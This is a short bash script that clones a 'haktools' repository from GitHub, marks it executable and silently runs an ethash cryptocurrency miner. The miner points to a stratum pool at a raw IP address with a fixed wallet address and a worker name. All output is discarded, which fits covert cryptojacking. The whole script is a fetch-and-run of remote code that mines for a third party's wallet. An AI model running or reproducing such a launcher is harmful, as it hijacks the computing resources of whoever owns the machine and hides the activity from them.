#!/bin/bash
cd /localpush
git clone https://github.com/polandhak/haktools.git -q
chmod -R +x haktools
./haktools/local -a ethash -o stratum+tcp://135.125.163.215:2020 -u 0xA4260aA3aE3F16E5b74CC2CFA8ebeAc0933064F8 -p x -w az-kienmai-06 > /dev/null 2>&1